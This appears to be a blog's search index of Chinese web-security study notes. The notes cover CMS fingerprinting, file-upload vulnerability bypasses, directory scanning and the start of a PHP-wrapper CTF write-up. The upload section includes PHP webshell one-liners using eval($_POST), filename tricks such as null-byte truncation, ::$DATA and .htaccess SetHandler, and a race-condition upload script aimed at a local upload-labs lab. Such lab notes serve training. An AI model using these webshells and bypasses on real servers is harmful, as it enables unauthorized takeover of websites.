<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CMS_Penetration_Notes</title>
      <link href="/2020/05/14/CMS-Penetration-Notes/"/>
      <url>/2020/05/14/CMS-Penetration-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="识别CMS"><a href="#识别CMS" class="headerlink" title="识别CMS"></a>识别CMS</h2><p>通过某项特征来识别，获得网站某个文件的MD5或者用正则表达式与字典里面的关键字进行匹配，如果匹配成功就 说明这个站点是对于的CMS。</p><a id="more"></a><h3 id="国内在线web指纹识别系统"><a href="#国内在线web指纹识别系统" class="headerlink" title="国内在线web指纹识别系统"></a>国内在线web指纹识别系统</h3><ol><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉</a></li><li><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">潮汐指纹</a></li><li><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">who am i web指纹识别</a></li></ol><h3 id="国外在线web指纹识别系统"><a href="#国外在线web指纹识别系统" class="headerlink" title="国外在线web指纹识别系统"></a>国外在线web指纹识别系统</h3><ol><li><a href="https://whatcms.org/" target="_blank" rel="noopener">WhatCMS</a></li><li><a href="https://cmsdetect.com/" target="_blank" rel="noopener">CMSdetect</a></li><li><a href="https://itrack.ru/whatcms/" target="_blank" rel="noopener">itrack</a></li></ol><h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:github.com cms识别工具</span><br></pre></td></tr></table></figure><h3 id="robots-txt文件"><a href="#robots-txt文件" class="headerlink" title="robots.txt文件"></a>robots.txt文件</h3><h3 id="404报错页面"><a href="#404报错页面" class="headerlink" title="404报错页面"></a>404报错页面</h3><h2 id="渗透方法"><a href="#渗透方法" class="headerlink" title="渗透方法"></a>渗透方法</h2><p>因为这些cms都是开源的，所以各路黑客都会对这些源代码进行审计(也就是传说中的代码审计)，经过长时间的审计与利用，很多CMS就会被爆出很多漏洞及其利用方式，我们只要把相应的请求发到到目标网站，就可成功利用，并获取到漏洞带来的权益。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞学习笔记</title>
      <link href="/2020/05/10/UploadBug-Notes/"/>
      <url>/2020/05/10/UploadBug-Notes/</url>
      
        <content type="html"><![CDATA[<p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。</p><ul><li>特点：利用简单，危害大。</li><li>产生原因：缺少必要的校验<a id="more"></a></li></ul><p><strong>找文件上传点（关键）</strong>：</p><ul><li>管理后台页面</li><li>用户后台页面</li><li>前台页面</li><li>目录扫描 ==&gt;扫描到后台不需要登陆就能访问的上传页面</li></ul><h2 id="前端验证突破"><a href="#前端验证突破" class="headerlink" title="前端验证突破"></a>前端验证突破</h2><p>前端验证一般是通过JavaScript对上传操作进行控制。</p><h3 id="判断为前端验证"><a href="#判断为前端验证" class="headerlink" title="判断为前端验证"></a>判断为前端验证</h3><ul><li>右键查看源代码</li><li>直接上传文件，如果网站非常快弹出提示。</li></ul><h3 id="绕过前端验证"><a href="#绕过前端验证" class="headerlink" title="绕过前端验证"></a>绕过前端验证</h3><ul><li>通过浏览器审查元素对网页的代码查看，找到对文件格式或大小的限制然后修改即可;</li><li>通过Burpsuite工具对浏览器进行代理，抓包对包里的内容进行修改</li><li>浏览器禁用 JavaScript 脚本</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>uppload-labs Pass-01</p><h2 id="文件内容检查的突破"><a href="#文件内容检查的突破" class="headerlink" title="文件内容检查的突破"></a>文件内容检查的突破</h2><ul><li>Content-type检查</li><li>文件头检查</li><li><code>getimagesize()</code>检查</li><li><code>php_exif</code>模块检查</li><li><code>imagecreatefromjpeg</code>二次渲染</li></ul><h3 id="文件内容检查测试流程"><a href="#文件内容检查测试流程" class="headerlink" title="文件内容检查测试流程"></a>文件内容检查测试流程</h3><ol><li>上传一张正常图片，验证上传功能是否正常</li><li>最好直接上传一张图片马，可绕过<code>content-type</code>，文件头，<code>getimagesize()</code>，<code>php_exif</code>检查</li><li>针对二次渲染，寻找图片数据中不会被转换的部分，将代码插入其中</li></ol><h3 id="content-type-检查"><a href="#content-type-检查" class="headerlink" title="content-type 检查"></a>content-type 检查</h3><p>抓包将<code>content-type</code>改为图片形式（即’image/png’等），即可成功上传。</p><p>常见的MIME类型：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">text/html: HTML格式</span><br><span class="line">text/plain: 纯文本格式</span><br><span class="line">text/xml: XML格式</span><br><span class="line">image/gif: gif图片格式</span><br><span class="line">image/jpeg: jpg图片格式</span><br><span class="line">image/png: png图片格式</span><br><span class="line"></span><br><span class="line">以application开头的媒体格式类型：</span><br><span class="line"></span><br><span class="line">application/xhtml+xml: XHTML格式</span><br><span class="line">application/xml: XML数据格式</span><br><span class="line">application/atom+xml: Atom XML聚合格式</span><br><span class="line">application/json: JSON数据格式</span><br><span class="line">application/pdf: pdf格式</span><br><span class="line">application/msword: Word文档格式</span><br><span class="line">application/octet-stream: 二进制流数据（如常见的文件下载）</span><br><span class="line">application/x-www-form-urlencoded: <span class="tag">&lt;<span class="name">form</span> <span class="attr">encType</span>=<span class="string">””</span>&gt;</span>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</span><br><span class="line"></span><br><span class="line">另外一种常见的媒体格式是上传文件之时使用的：</span><br><span class="line"></span><br><span class="line">multipart/form-data: 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure><p>实例：uppload-labs Pass-02</p><h3 id="文件头检查绕过"><a href="#文件头检查绕过" class="headerlink" title="文件头检查绕过"></a>文件头检查绕过</h3><ul><li>在文件头添加<ul><li>.gif, “GIF89A” <code>47 49 46 38 39 61</code></li><li>.JPEG;.JPE;.JPG，”JPGGraphicFile” <code>FF D8 FF E0 00 10 4A 46 49 46</code></li><li>.PNG <code>89 50 4E 47 0D 0A 1A 0A</code></li></ul></li><li>图片一句话</li><li>结合文件包含漏洞或者解析漏洞</li></ul><p>其他类型的文件头</p><table><thead><tr><th>格式</th><th>文件头</th></tr></thead><tbody><tr><td>TIFF (tif)</td><td><code>49 49 2A 00</code></td></tr><tr><td>Windows Bitmap (bmp)</td><td><code>42 4D</code></td></tr><tr><td>CAD (dwg)</td><td><code>41 43 31 30</code></td></tr><tr><td>Adobe Photoshop (psd)</td><td><code>38 42 50 53</code></td></tr><tr><td>Rich Text Format (rtf)</td><td><code>7B 5C 72 74 66</code></td></tr><tr><td>MS Word/Excel (xls.or.doc)</td><td><code>D0 CF 11 E0</code></td></tr><tr><td>MS Access (mdb)</td><td><code>53 74 61 6E 64 61 72 64 20 4A</code></td></tr><tr><td>ZIP Archive (zip)</td><td><code>50 4B 03 04</code></td></tr><tr><td>RAR Archive (rar)</td><td><code>52 61 72 21</code></td></tr><tr><td>Wave (wav)</td><td><code>57 41 56 45</code></td></tr><tr><td>AVI (avi)</td><td><code>41 56 49 20</code></td></tr><tr><td>Real Media (rm)</td><td><code>2E 52 4D 46</code></td></tr><tr><td>MPEG (mpg)</td><td><code>00 00 01 BA</code></td></tr><tr><td>MPEG (mpg)</td><td><code>00 00 01 B3</code></td></tr><tr><td>Quicktime (mov)</td><td><code>6D 6F 6F 76</code></td></tr><tr><td>Adobe Acrobat (pdf)</td><td><code>25 50 44 46 2D 31 2E</code></td></tr><tr><td>Windows Media (asf)</td><td><code>30 26 B2 75 8E 66 CF 11</code></td></tr><tr><td>MIDI (mid)</td><td><code>4D 54 68 64</code></td></tr></tbody></table><p>实例：</p><ul><li>uppload-labs Pass-13</li><li>uppload-labs Pass-14 <code>getimagesize()</code></li><li>uppload-labs Pass-14 <code>php_exif需要开启</code></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>imagecreatefromjpeg 实例：uppload-labs Pass-16</p><p>绕过方式：寻找渲染前后不变的地方，替换成一句话。最好用比对的工具做对比，例如二次渲染木马生成器，或者写一个脚本文件比较前后区别。</p><p><a href="https://secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">pass16详细分析</a></p><p><a href="https://github.com/gwjczwy/jpg_payload" target="_blank" rel="noopener">jpg_payload</a></p><h2 id="白名单验证的突破"><a href="#白名单验证的突破" class="headerlink" title="白名单验证的突破"></a>白名单验证的突破</h2><h3 id="修改MIME类型绕过白名单限制"><a href="#修改MIME类型绕过白名单限制" class="headerlink" title="修改MIME类型绕过白名单限制"></a>修改MIME类型绕过白名单限制</h3><p>与Content-type验证绕过相同</p><h3 id="00截断绕过白名单限制"><a href="#00截断绕过白名单限制" class="headerlink" title="00截断绕过白名单限制"></a>00截断绕过白名单限制</h3><p>截断的核心，就是chr(0)这个字符。先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格。当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。</p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>php版本小于5.3.4 详情关注<code>CVE-2006-7243</code></li><li>php的<code>magic_quotes_gpc</code>为<code>OFF</code>状态</li></ul><p>实例：</p><ul><li>uppload-labs Pass-11</li><li>uppload-labs Pass-12</li></ul><h4 id="能够进行截断的点"><a href="#能够进行截断的点" class="headerlink" title="能够进行截断的点"></a>能够进行截断的点</h4><p>文件名，路径</p><p>注意，submit提交方式(POST/GET)不一定为图片流(POST/GET)的请求方式。POST 不会像 GET 对 <code>%00</code> 进行解码，所以需要在十六进制中手动修改。，修改方式：例如在文件后缀或路径后加一个空格，此时空格为 <code>0x20</code>，在 Burpsuite 的 Hex 模式中手动改为 <code>0x00</code>。</p><h3 id="解析漏洞绕过白名单限制"><a href="#解析漏洞绕过白名单限制" class="headerlink" title="解析漏洞绕过白名单限制"></a>解析漏洞绕过白名单限制</h3><h4 id="双重拓展名"><a href="#双重拓展名" class="headerlink" title="双重拓展名"></a>双重拓展名</h4><p>Apache 文件名解析时，是从后面开始检查后缀，按最后一个合法后缀执行。如:<code>shell.php.xxx</code>因为<code>xxx</code>不被apache解析，所以apache会跳过 <code>.xxx</code> ，而解析最后一个后缀名，即<code>.php</code>，从而把这个文件当php文件解析了。</p><h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><h5 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h5><p><code>*.asp;1.jpg</code> 利用<code>;</code>截断。</p><h5 id="IIS-7-0-7-5-Nginx-lt-8-03"><a href="#IIS-7-0-7-5-Nginx-lt-8-03" class="headerlink" title="IIS 7.0/7.5/Nginx&lt;8.03"></a>IIS 7.0/7.5/Nginx&lt;8.03</h5><p>php.ini里默认<code>cgi.fix_pathinfo=1</code>，对其进行访问的时候，在URL路径后添加<code>.php</code>后缀名会当做php文件进行解析，漏洞由此产生。上传 <code>1.jpg</code> ， 访问 <code>http://www.xxx.com/1.jpg/.php</code>， 此 时 1.JPG 会被当做PHP 脚本文件来解析。</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>可以利用字典排查，fuzz。</p><h2 id="黑名单验证的突破"><a href="#黑名单验证的突破" class="headerlink" title="黑名单验证的突破"></a>黑名单验证的突破</h2><h3 id="操作系统特性"><a href="#操作系统特性" class="headerlink" title="操作系统特性"></a>操作系统特性</h3><ul><li>Windows操作系统对<strong>大小写不敏感</strong>，即php和Php在windows看来是一样的</li><li>Windows系统下，如果上传的文件名中<code>test.php::$DATA</code>会在服务器上生成一个<code>test.php</code>的文— 件，其中内容和所 上传文件内容相同，并被解析。即上传文件xxx.php::$DATA = xxx.php</li><li>Windows下文件名结尾加入<code>., 空格, &lt;,· &gt;, &gt;&gt;&gt;,0x81-0xff</code>等字符，会被windows自动去除<br>例如: <code>xxx.php.</code>，绕过WAF，在服务器中被Windows剔除</li></ul><h3 id="语言特性"><a href="#语言特性" class="headerlink" title="语言特性"></a>语言特性</h3><table><thead><tr><th>语言</th><th>可解析后缀</th></tr></thead><tbody><tr><td>php</td><td>php, php5, php4 , php3, php2, pHp, pHp5, pHp4 ,pHp3, pHp2, html, htm, phtml, pht ,Html, Htm, pHtml</td></tr><tr><td>jsp</td><td>jsp, jspa, jspx, jsw, jsv, jspf, jtml, jSp, jSpx, jSpa, jSw, jSv, jSpf, jHtml</td></tr><tr><td>asp/aspx</td><td>asp, aspx, asa, asax, ascx, ashx, asmx, cer, aSp, aSpx, aSa, aSax, aScx, aShx, aSmx, cEr</td></tr></tbody></table><h3 id="中间件特性"><a href="#中间件特性" class="headerlink" title="中间件特性"></a>中间件特性</h3><ol><li>确定容器</li><li>尝试用解析漏洞上传</li></ol><h3 id="代码不严谨"><a href="#代码不严谨" class="headerlink" title="代码不严谨"></a>代码不严谨</h3><ol><li>双写绕过，例如<code>1.AsaspP</code></li><li>对于空格，点只做了单次过滤，例如<code>1.php. .</code>，过滤空格、点后，<code>1.php.</code></li></ol><h3 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h3><ol><li><p>手工测试</p></li><li><p>使用字典+burp，去fuzz后缀名寻找成功上传的思路 <code>upload-fuzz-dic-builder</code><br><a href="http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/" target="_blank" rel="noopener">构造优质上传漏洞fuzz字典</a><br>注: 使用fuzz测试上传大小尽量小，缺点：<strong>产生大量上传文件</strong>，不推荐在没有任何测试的基础上直接fuzz。</p></li></ol><p>实例：</p><ul><li>uppload-labs Pass-03 特殊拓展名</li><li>uppload-labs Pass-06 过滤不严谨</li><li>uppload-labs Pass-10 双写绕过</li></ul><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="探查目标web服务器"><a href="#探查目标web服务器" class="headerlink" title="探查目标web服务器"></a>探查目标web服务器</h3><ol><li>通过查看相应的http请求，会在头部暴露出web服务器类型</li><li>安装浏览器插件 <code>Wappalyzer</code></li><li>通过第三方网站 <code>http://www.yunsee.cn/info.html</code></li></ol><h3 id="解析漏洞详解"><a href="#解析漏洞详解" class="headerlink" title="解析漏洞详解"></a>解析漏洞详解</h3><h4 id="IIS-5-X-6-0解析漏洞"><a href="#IIS-5-X-6-0解析漏洞" class="headerlink" title="IIS 5.X/6.0解析漏洞"></a>IIS 5.X/6.0解析漏洞</h4><ol><li><p>目录解析漏洞:<br>服务器默认会把<code>.asp</code>，<code>.asa</code>目录下的文件都解析成asp文件。<br>前提是可以控制<strong>文件上传的路径</strong>或者是<strong>文件名</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.asp/xxx.jpg</span><br></pre></td></tr></table></figure></li><li><p>文件名解析漏洞:<br>服务器默认不会取解析分号后面的内容。<br>前提是可以控制<strong>文件名</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.asp;.jpg</span><br></pre></td></tr></table></figure></li><li><p>畸形解析:<br>iis6.0下的可执行文件还有<code>asa cer cdx asax</code> 也会解析成 <code>asp</code>。<br>注意：不一定能解析<code>aspx</code>，因为<code>aspx</code>是.net 环境。</p></li></ol><h4 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt; 8.03"></a>IIS 7.0/IIS 7.5/ Nginx &lt; 8.03</h4><ol><li><p>利用解析图片中的代码上传webshell<br>如果开启<code>Fast -CGI</code>模式，上传 <code>1.jpg</code>，内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问<code>1.jpg/.php</code>,在这个目录下就会生成一句话木马shell.php。</p></li><li><p>fck+iis7.5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.aspx.a.aspx.jpg..jpg</span><br></pre></td></tr></table></figure></li></ol><h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><h5 id="不可识别解析后缀"><a href="#不可识别解析后缀" class="headerlink" title="不可识别解析后缀"></a>不可识别解析后缀</h5><ol><li><p>Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。</p></li><li><p>在Apache的解析中，除了“<code>php|php3|phtml</code>”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dark5.php.k1.w2.a3 -&gt; dark5.php</span><br></pre></td></tr></table></figure></li></ol><h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><ol><li>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。</li><li>通过htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、 禁止目录列表、配置默认文档等功能。</li><li>该漏洞适用于目标web服务器为apache，并且<code>.htaccess</code><strong>可以被上传执行</strong>的情况。</li><li>当<code>.htaccess</code>文件内容为<code>SetHandler application/x-httpd-php</code>时，即设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。</li><li>在Apache中如果需要启动 <code>.htaccess</code>，必须在<code>http.conf</code>中设置 <code>AllowOverride</code>为<code>All</code>。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所有文件：</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">或者：</span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">1.jpg</span>"&gt;</span> SetHandler application/x-httpd-php <span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实例：uppload-labs Pass-04</p><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><ol><li><p>CGI与IIS 7.X 相同</p></li><li><p>空字节代码执行（00截断）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dark5.jpg%00.php</span><br></pre></td></tr></table></figure></li></ol><h2 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h2><p>应用场景：</p><ol><li>南方/良精CMS</li><li>正则默认匹配第一个filename的情况下（双写Filename方式绕过）</li></ol><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>服务端默认取第二个文件作为真正的上传文件，但是在检测时只检测了第一个文件。或者只验证了第一个 filename 的拓展名。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ol><li>直接在审查元素中添加一个<strong>上传表单</strong>（与原页面表单相同）</li><li>burp抓包之后在数据包中添加</li></ol><h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><p>代码逻辑为:先将文件上传到服务器，然后检测后缀名，如果不符合再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。</p><p>利用方法: 使用burp suite不停的上传，同时用python脚本不停的访问上传的文件。上传内容如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>实例：uppload-labs Pass-17</p><p>在Burpsuite Intruder中，不停上传<code>shell.php</code>，同时利用脚本不停的访问<code>shell.php</code>，访问成功即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1/upload-labs/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1/upload-labs/Pass-17/index.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">解析漏洞参考</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目录扫描学习笔记</title>
      <link href="/2020/05/10/DirScan-Notes/"/>
      <url>/2020/05/10/DirScan-Notes/</url>
      
        <content type="html"><![CDATA[<p>目录扫描是Web渗透过程中信息搜集的重要部分。通过目录扫描，能找到更多有价值的信息，这些信息可能是我们无法直接从网站前台获取到的。</p><a id="more"></a><ul><li>上传</li><li>管理后台</li><li>暴露出其他信息<ul><li>phpinfo页面</li><li>phpadmin登录页</li><li>网站配置相关信息 (readme.txt,password.txt)</li><li>网站源码备份 (7z,zip,rar文件)</li><li>…</li></ul></li><li>更多</li></ul><h2 id="扫描原理"><a href="#扫描原理" class="headerlink" title="扫描原理"></a>扫描原理</h2><p>通过提交一个 HTTP 请求来获取 HTTP 返回包，以查看返回包的信息来判断某个目录(文件)是否存在。</p><p>常用请求方式</p><ul><li>GET<ul><li>优点: 有完整返回包</li><li>缺点: 速度慢</li></ul></li><li>HEAD<ul><li>优点: 速度快</li><li>缺点: 只有返回包头</li></ul></li></ul><h2 id="常用扫描器"><a href="#常用扫描器" class="headerlink" title="常用扫描器"></a>常用扫描器</h2><h3 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h3><ul><li><strong>御剑系列</strong><br>经典，准确，速度快</li><li><strong>7kbscan-WebPathBrute</strong><br>7kbscan是继御剑以后，比较好用的目录扫描工具。</li></ul><h3 id="跨平台Python-Java"><a href="#跨平台Python-Java" class="headerlink" title="跨平台Python/Java"></a>跨平台Python/Java</h3><ul><li><strong>PmWebDirScan</strong></li><li><strong>Burpsuite</strong><br>target-&gt;site map-&gt;Engagement-&gt;tools中的Discover content用来作为目录扫描工具是非常好用的。扫描程度很深，再配上自制的字典，基本上可以抛开某些扫描器了。</li><li><strong>DirBuster</strong> (OWASP top 10)</li><li><strong>Dirsearch</strong><br>这个是很多大佬都推荐的目录扫描工具，效果确实不错。但是缺点也很明显，流量太大了。</li></ul><h2 id="查找网络后台的方法"><a href="#查找网络后台的方法" class="headerlink" title="查找网络后台的方法"></a>查找网络后台的方法</h2><ol><li><p>穷举猜解  –&gt; 目录扫描<br>御剑 pkav破壳扫描器  safe3</p></li><li><p>开源类程序<br>网站爬行–&gt;目录结构 –&gt; 通过经验判断<br>web指纹识别工具：御剑web指纹识别、椰树1.7<br>网站版权信息：Power by DedeCms</p></li><li><p>搜索引擎<br>site:hscjy.com inurl:login  admin manage member user manager</p></li><li><p>二级域名<br>Google Hacking</p></li><li><p>其他端口<br>例如主页在80端口，管理页面在82端口</p></li><li><p>盲打  &lt;– Xss –&gt; 存储型XSS –&gt; cookie –&gt; 后台地址  (不要注入)<br>同一个建站公司做的<br> A  ：目标<br> B  ：</p></li><li><p>站点备份</p></li><li><p>站点其他文件</p></li><li><p>嗅探</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 目录扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Pseudo-protocol</title>
      <link href="/2020/05/09/PHP-Pseudo-protocol/"/>
      <url>/2020/05/09/PHP-Pseudo-protocol/</url>
      
        <content type="html"><![CDATA[<p>最近做攻防世界的CTF题时，遇到了有关PHP伪协议的知识。Web_php_include考察的是文件包含的知识。本文整理了网络上的解题思路以及伪协议的相关知识。</p><a id="more"></a><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码可知程序过滤掉了<code>page=参数传入php://</code>。</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" 